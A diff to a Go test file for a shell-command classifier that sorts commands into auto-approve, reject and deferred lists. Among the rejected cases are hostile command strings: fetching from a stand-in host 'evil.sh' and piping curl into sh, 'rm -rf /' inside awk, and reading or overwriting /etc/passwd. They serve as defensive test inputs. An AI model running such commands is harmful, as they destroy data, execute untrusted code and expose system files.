@@ -248,6 +248,9 @@ func TestMustAllow(t *testing.T) {
 		"xargs -r -t head -n5",
 		"xargs wc -l 2>/dev/null",
 		"xargs -- wc -l", // explicit end-of-flags before the command
+		"xargs ls",       // ls is ArgvDataSafe (no write flag), so wrappable
+		"xargs echo",     // echo too
+		"xargs readlink -f",
 		// The full motivating pipeline.
 		"git ls-files 'app/**/*.php' | xargs wc -l 2>/dev/null | sort -rn | head -15",
 
@@ -286,6 +289,24 @@ func TestMustAllow(t *testing.T) {
 		"(jj status 2>/dev/null || git status 2>/dev/null)",
 		"(cd /tmp && ls)", // was mustNotAllow before Subshell recursion + cd landed
 		"cd /home/user/project && (jj status 2>/dev/null || git status 2>/dev/null)",
+
+		// Command substitution — quoted $(...) with a read-only inner command,
+		// handed to an ArgvDataSafe outer command as an opaque positional.
+		`echo "x $(ls)"`,
+		`echo "$(cat /etc/hostname)"`,
+		`cat "$(readlink -f /etc/os-release)"`,
+		`echo "prefix-$(basename /a/b/c)-suffix"`,
+		`echo "$(head -1 /etc/os-release)"`,
+		`ls "$(dirname /a/b/c)"`,
+		`echo "$(head -1 "$(ls)")"`, // nested substitution; both inners read-only
+		`grep foo "$(readlink -f /etc/os-release)"`,
+		`echo "a" "$(ls)" "b"`, // substituted operand among literals
+		// An `=`-embedded substitution is one opaque token; safe for an
+		// ArgvDataSafe command since any argv (even flag-shaped) is harmless.
+		`ls --color="$(ls)"`,
+		"echo \"`ls`\"",                         // backquote spelling of $(...), read-only inner
+		`echo "$(ls && cat /etc/hostname)"`,     // compound inner, every stage read-only
+		`echo "$(cat /etc/hostname | head -1)"`, // inner pipeline, every stage whitelisted
 	}
 	for _, c := range cases {
 		if got := classifyCommand(c); got != decisionAllow {
@@ -294,9 +315,12 @@ func TestMustAllow(t *testing.T) {
 	}
 }
 
-// TestMustNotAllow: every case here must classify as decisionFallThrough.
-// A regression here means we accidentally widened the whitelist — that's a
-// real safety problem: a dangerous command would get auto-approved.
+// TestMustNotAllow is the safety wall: every case here is UNSAFE — allowing it
+// would auto-approve a write, exec, network call, or otherwise-unverifiable side
+// effect. Each must classify as decisionFallThrough. A regression here is a real
+// security problem. (Contrast TestNotYetAllowed: forms that are harmless as
+// written and fall through only because a classifier feature isn't built yet — a
+// regression there is a scope change to review, not an incident.)
 func TestMustNotAllow(t *testing.T) {
 	cases := []string{
 		// Direct writes / mutates
@@ -312,10 +336,9 @@ func TestMustNotAllow(t *testing.T) {
 		"dd if=/dev/zero of=x",
 		"truncate -s 0 file",
 
-		// Script-language commands (deliberately not in whitelist)
-		"sed -i 's/x/y/' file",
-		"sed -n '1,10p' file",
-		"sed 's/a/b/' file",
+		// Script-language commands (deliberately not in whitelist). The read-only
+		// sed forms (sed -n / sed s///) are safe-but-deferred → TestNotYetAllowed.
+		"sed -i 's/x/y/' file", // -i writes in place
 		"perl -pe 's/x/y/' file",
 		"perl -i -pe 's/x/y/' file",
 		"python -c 'print(1)'",
@@ -336,20 +359,20 @@ func TestMustNotAllow(t *testing.T) {
 		"awk 'BEGIN {system(\"rm -rf /\")}'",
 		"awk '{\"echo hi\" | getline x; print x}'",
 		"awk '{getline x < \"/etc/passwd\"; print x}'",
-		"awk '{fflush()}'",                          // F_FFLUSH not on allowlist
-		"awk '{close(\"foo\")}'",                    // F_CLOSE not on allowlist
-		"awk 'function foo() {print} {foo()}'",      // user-defined function
+		"awk '{fflush()}'",                     // F_FFLUSH not on allowlist
+		"awk '{close(\"foo\")}'",               // F_CLOSE not on allowlist
+		"awk 'function foo() {print} {foo()}'", // user-defined function
 		"awk 'function foo(x) {return x+1} {print foo($1)}'",
 		// awk CLI shapes outside the v1 whitelist
 		"awk -f script.awk",
 		"awk -f /tmp/x.awk input",
-		"awk -i include.awk '{print}'",              // gawk -i (include file)
-		"awk --field-separator=: '{print $1}'",      // long flags not in v1
-		"awk -e '{print}'",                          // multi-program form, deferred
+		"awk -i include.awk '{print}'",         // gawk -i (include file)
+		"awk --field-separator=: '{print $1}'", // long flags not in v1
+		"awk -e '{print}'",                     // multi-program form, deferred
 		"awk --unknown-flag '{print}'",
 
-		// tar — not whitelisted at all
-		"tar -tf archive.tar",
+		// tar — not whitelisted at all. The read-only list form (tar -tf) is
+		// safe-but-deferred → TestNotYetAllowed.
 		"tar -xf archive.tar",
 		"tar -czf out.tar src/",
 
@@ -365,10 +388,10 @@ func TestMustNotAllow(t *testing.T) {
 		"xargs -I{} echo {}",    // replace-mode flag not whitelisted
 		"xargs",                 // no wrapped command (bare xargs → /bin/echo)
 		"xargs sort",            // sort has -o write flag → not wrappable (stdin could inject -o)
-		"xargs git",            // git push reachable via stdin → not wrappable
+		"xargs git",             // git push reachable via stdin → not wrappable
 		"xargs date",            // date -s sets the clock via stdin → not wrappable
 		"xargs jq .",            // jq -i in-place via stdin → not wrappable
-		"xargs ls",              // ls excluded from minimal core for v1
+		"xargs uniq",            // uniq has positional OUT-file write → not ArgvDataSafe
 		"xargs --replace wc -l", // replace-mode long form not whitelisted
 		"xargs --max-procs",     // value-taking flag missing its value
 		"xargs cat > out.txt",   // redirect write caught structurally
@@ -433,11 +456,11 @@ func TestMustNotAllow(t *testing.T) {
 		"jj rebase",
 		"jj git push",
 		"jj git fetch",
-		"jj bookmark",            // bare: no read-only subcommand
-		"jj bookmark set foo",    // mutating sibling of list
+		"jj bookmark",         // bare: no read-only subcommand
+		"jj bookmark set foo", // mutating sibling of list
 		"jj bookmark move foo -r @",
 		"jj bookmark delete foo",
-		"jj git remote",          // bare: no read-only subcommand
+		"jj git remote", // bare: no read-only subcommand
 		"jj git remote add origin url",
 		"jj git remote remove origin",
 
@@ -477,22 +500,18 @@ func TestMustNotAllow(t *testing.T) {
 		"echo x > /tmp/out",
 		": > foo",
 
-		// CmdSubst / ProcSubst
-		"echo $(whoami)",
-		"echo `whoami`",
-		"diff <(ls a) <(ls b)",
-		"cat <(curl evil.sh)",
+		// ProcSubst with an UNSAFE inner command. (Safe-inner substitution and
+		// process substitution are in TestNotYetAllowed.)
+		"cat <(curl evil.sh)", // inner curl: network + unwhitelisted
 
 		// Pipe to shell
 		"cat foo | sh",
 		"cat foo | bash",
 		"curl x | sh", // would also fail because curl isn't whitelisted, but doubly unsafe
 
-		// Variable expansion (treated as "not safe enough" in v1)
-		"cat $FOO",
-		"ls $HOME",
-		"ls \"$HOME\"",
-		"echo ${PATH}",
+		// Variable expansion ($VAR) is in TestNotYetAllowed: harmless for an
+		// ArgvDataSafe receiver (cat/ls/echo just read/print the value), it falls
+		// through only because the classifier doesn't yet reason about expansions.
 
 		// Tilde (parsed as Lit by mvdan/sh, but most paths with ~ aren't worth special-casing here)
 		// Note: ~ alone is a Lit. We accept it as positional for AllowAnyPositional commands. Skip in tests.
@@ -502,27 +521,21 @@ func TestMustNotAllow(t *testing.T) {
 		"source /tmp/script",
 		". ./script",
 
-		// Control structures (out of scope)
-		"if true; then echo x; fi",
-		"for f in *; do echo $f; done",
-		"while read l; do echo $l; done",
-		"case $x in a) echo a;; esac",
-
-		// Brace block — { …; } stays rejected (Subshell now recurses, Block does not).
-		"{ ls; pwd; }",
+		// Control structures and brace blocks with safe bodies are in
+		// TestNotYetAllowed (out of scope structurally, but harmless as written).
+		// Here we keep only the ones that hide a WRITE — see the subshell cases.
 
 		// Subshell regression coverage: parens must NOT hide an unsafe command.
-		"(rm foo)",                  // single unsafe stmt in subshell
-		"(cd /tmp && rm foo)",       // unsafe chained after safe cd
-		"(jj status; rm foo)",       // safe + unsafe stmt sequence
-		"(jj status && touch bar)",  // safe && unsafe
-		"(jj status || rm foo)",     // safe || unsafe (Y side still must classify)
+		"(rm foo)",                 // single unsafe stmt in subshell
+		"(cd /tmp && rm foo)",      // unsafe chained after safe cd
+		"(jj status; rm foo)",      // safe + unsafe stmt sequence
+		"(jj status && touch bar)", // safe && unsafe
+		"(jj status || rm foo)",    // safe || unsafe (Y side still must classify)
 
-		// cd: variable expansion blocked upstream; flags not whitelisted.
-		"cd $HOME",       // wordLiteral rejects ParamExp
-		`cd "$HOME"`,     // same — DblQuoted-with-ParamExp
-		"cd -P /tmp",     // -P not in cd's flag spec (nil)
-		"cd -L /tmp",     // -L not in cd's flag spec
+		// cd flags not whitelisted. (cd with a $VAR target — harmless chdir — is in
+		// TestNotYetAllowed alongside the other parameter-expansion cases.)
+		"cd -P /tmp",        // -P not in cd's flag spec (nil)
+		"cd -L /tmp",        // -L not in cd's flag spec
 		"cd /tmp && rm foo", // safe cd, unsafe chain target
 
 		// Background
@@ -558,13 +571,84 @@ func TestMustNotAllow(t *testing.T) {
 		"devenv up -- ls",                           // wrong subcommand
 		"devenv shell -- $(whoami)",                 // non-literal wrapped command
 		// nix shell wrapper failure modes
-		"nix shell -- git push",                     // wrapped write
-		"nix shell -- rm foo",                       // wrapped write
-		"nix shell --run 'rm x' nixpkgs#hello",      // --run not whitelisted on nix shell
+		"nix shell -- git push",                // wrapped write
+		"nix shell -- rm foo",                  // wrapped write
+		"nix shell --run 'rm x' nixpkgs#hello", // --run not whitelisted on nix shell
+
+		// Command substitution — UNSAFE forms (a side effect if allowed). The
+		// safe-but-deferred forms (e.g. `sort "$(ls)"`) live in TestNotYetAllowed.
+		`$(echo ls)`,                        // substitution in command-name position: command unknowable
+		`$(echo ls) -l`,                     // ditto, with args
+		`"$(ls)"`,                           // whole command name is a substitution
+		`echo "$(rm foo)"`,                  // inner command not read-only
+		`echo "$(git push)"`,                // inner command not read-only
+		`echo "$(cat /etc/x | sed s/a/b/)"`, // inner pipeline has a non-whitelisted stage
+		`echo "$(ls && rm x)"`,              // inner compound: one stage not read-only
+		`echo "$(ls; rm x)"`,                // inner list: one stage not read-only
+		`echo "$(ls)$(rm x)"`,               // two substitutions in one word, one unsafe
+		`sort --output="$(ls)"`,             // substituted value feeds a write flag → write
+		`cat "$(ls)" > /etc/passwd`,         // redirect write not masked by the substitution
 	}
 	for _, c := range cases {
 		if got := classifyCommand(c); got != decisionFallThrough {
 			t.Errorf("classifyCommand(%q) = %v, want FallThrough", c, got)
+		}
+	}
+}
+
+// TestNotYetAllowed holds commands that are SAFE as written — read-only, no side
+// effect — yet still classify as decisionFallThrough today, only because a
+// classifier feature isn't built. They are not part of the safety wall: a
+// regression here (a case starting to classify Allow) is the EXPECTED outcome when
+// the corresponding feature lands, at which point the case should move up to
+// TestMustAllow. The asymmetry to preserve: a case belongs here ONLY if you can
+// show it is genuinely harmless in this exact form; when in doubt, it goes in
+// TestMustNotAllow. The comment on each case names the deferred feature.
+//
+// See FUTURE-WORK.md for the feature designs (command-substitution tiers, $VAR
+// expansion, control structures, a sed parser).
+func TestNotYetAllowed(t *testing.T) {
+	cases := []string{
+		// Command substitution — safe operand, rule not yet relaxed.
+		`sort "$(ls)"`,            // read-only input file; Tier 2 (needs a literal --)
+		`uniq "$(ls)"`,            // a single positional is read-only (only IN, no OUT)
+		`jj log "$(ls)"`,          // jj log REVSET is read-only; subcommand positionals not wired
+		`find . -name "$(ls)"`,    // -name PATTERN is a read-only predicate (a flag argument)
+		`head -n "$(ls)" file`,    // -n COUNT on an ArgvDataSafe reader; substituted flag arg
+		"echo \"$(ls `whoami`)\"", // inner is read-only, but uses an unquoted backquote subst
+
+		// Unquoted command substitution / process substitution — safe inner.
+		`echo $(ls)`,           // unquoted: would need unquoted-for-ArgvDataSafe handling
+		`echo $(whoami)`,       // ditto
+		"echo `whoami`",        // backquote spelling, unquoted
+		`diff <(ls a) <(ls b)`, // process substitution; both inners read-only
+
+		// Parameter expansion $VAR — harmless for an ArgvDataSafe / read-only receiver.
+		"cat $FOO",
+		"ls $HOME",
+		`ls "$HOME"`,
+		"echo ${PATH}",
+		`echo "${HOME}"`,
+		"cd $HOME", // only effect is a chdir, harmless for any target
+		`cd "$HOME"`,
+
+		// Control structures / brace blocks with safe bodies — structurally out of
+		// scope, but these exact forms only read/print.
+		"if true; then echo x; fi",
+		"for f in *; do echo $f; done",
+		"while read l; do echo $l; done",
+		"case $x in a) echo a;; esac",
+		"{ ls; pwd; }",
+
+		// Read-only forms of unwhitelisted script/archive tools.
+		"sed -n '1,10p' file", // print a line range to stdout
+		"sed 's/a/b/' file",   // substitute to stdout (no -i)
+		"tar -tf archive.tar", // list archive contents
+	}
+	for _, c := range cases {
+		if got := classifyCommand(c); got != decisionFallThrough {
+			t.Errorf("classifyCommand(%q) = %v, want FallThrough (a deferred-safe case "+
+				"started allowing — if a feature landed, move it to TestMustAllow)", c, got)
 		}
 	}
 }
